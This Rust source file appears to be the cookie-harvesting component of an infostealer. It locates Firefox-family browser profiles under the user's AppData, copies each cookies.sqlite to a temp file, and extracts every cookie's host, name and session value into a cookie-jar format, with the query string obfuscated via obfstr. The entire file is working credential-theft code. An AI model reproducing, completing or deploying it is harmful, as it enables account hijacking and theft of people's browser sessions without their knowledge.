use rusqlite::{Connection, OpenFlags};
use crate::browser::common::gecko::{get_user_data_dir, get_profile_names};

use std::{
    env,
    fs::{self},
    path::{Path},
};

use std::collections::HashMap;

use uuid::Uuid;

pub fn get_cookies() -> HashMap<String, Vec<String>> {
    let mut cookies: HashMap<String, Vec<String>> = HashMap::new();

    let userprofile_env = env::var("USERPROFILE").unwrap();
    let appdata_dir = Path::new(userprofile_env.as_str()).join("AppData");

    let temp_env = std::env::temp_dir();

    for gecko_target in crate::browser::browsers::gecko::get_targets() {
        let gecko_dir = appdata_dir.join(gecko_target);

        if !gecko_dir.exists() {
            continue;
        }
        
        let user_data_dir = get_user_data_dir(&gecko_dir);
        let profiles = get_profile_names(&user_data_dir);

        let browser_name = gecko_dir
            .file_name()
            .unwrap()
            .to_str()
            .unwrap()
            .split('\\')
            .last()
            .unwrap();

        let browser_name = browser_name.replace(" ", "");

        for profile in profiles {
            let profile_dir = user_data_dir.join(profile.clone());

            let cookie_db_path = profile_dir.join("cookies.sqlite");
            
            if !cookie_db_path.exists() {
                continue;
            }

            let mut temp_cookies: Vec<String> = Vec::new();
            let temp_path = temp_env.join(Uuid::new_v4().to_string());
            fs::copy(cookie_db_path, &temp_path).unwrap();
        
            let conn =Connection::open_with_flags(&temp_path, OpenFlags::SQLITE_OPEN_READ_ONLY).unwrap();
        
            let mut stmt = conn
            .prepare(obfstr::obfstr!(
                "SELECT host, sameSite, path, isSecure, expiry, name, value FROM moz_cookies"
            ))
            .unwrap();
        
            let mut rows = stmt.query([]).unwrap();
        
        
            while let Some(row) = rows.next().unwrap() {
                let host_key: String = row.get(0).unwrap();
                let samesite: i64 = row.get(1).unwrap();
                let path: String = row.get(2).unwrap();
                let is_secure: i64 = row.get(3).unwrap();
                let expires_utc: i64 = row.get(4).unwrap();
                let name: String = row.get(5).unwrap();
                let value: String = row.get(6).unwrap();
        
                // convert is secure to bool string
                let is_secure = if is_secure == 1 { "TRUE" } else { "FALSE" };
        
                let samesite = if samesite == 1 { "TRUE" } else { "FALSE" };
        
                let cookie = format!(
                    "{}\t{}\t{}\t{}\t{}\t{}\t{}",
                    host_key,
                    samesite,
                    path,
                    is_secure,
                    expires_utc,
                    name,
                    value
                );
        
                temp_cookies.push(cookie);
        
            }

            let name = "[".to_owned() + &profile + "]" + &browser_name;

            cookies.insert(name.clone(), temp_cookies.clone());
            drop(rows);
            stmt.finalize().unwrap();
            conn.close().unwrap();
            fs::remove_file(temp_path).unwrap();
        }
    }

    cookies
}